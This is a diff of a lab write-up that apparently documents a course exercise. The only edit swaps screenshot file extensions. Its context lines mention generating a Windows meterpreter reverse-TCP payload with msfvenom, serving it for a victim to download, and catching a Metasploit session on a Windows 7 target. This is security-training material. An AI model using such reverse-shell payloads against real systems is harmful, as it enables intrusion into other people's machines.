@@ -285,7 +285,7 @@ msfvenom -p windows/meterpreter_reverse_tcp \
 - Saved to `/var/www/html/` so it can be served via the web server for the victim to download
 - `uname -a` confirms the attacker machine: Kali Linux 5.18.0 x86_64
 
-![msfvenom Payload Generation](Lab06/1.jpg)
+![msfvenom Payload Generation](Lab06/1.png)
 
 ---
 
@@ -309,7 +309,7 @@ exploit
 - `dir` confirmed we are inside `C:\Users\User\Desktop\` on the Windows 7 target
 - `meterpreter > background` sent the session to background for further tasks
 
-![Metasploit Listener & Meterpreter Session](Lab06/2.jpg)
+![Metasploit Listener & Meterpreter Session](Lab06/2.png)
 
 ---
 
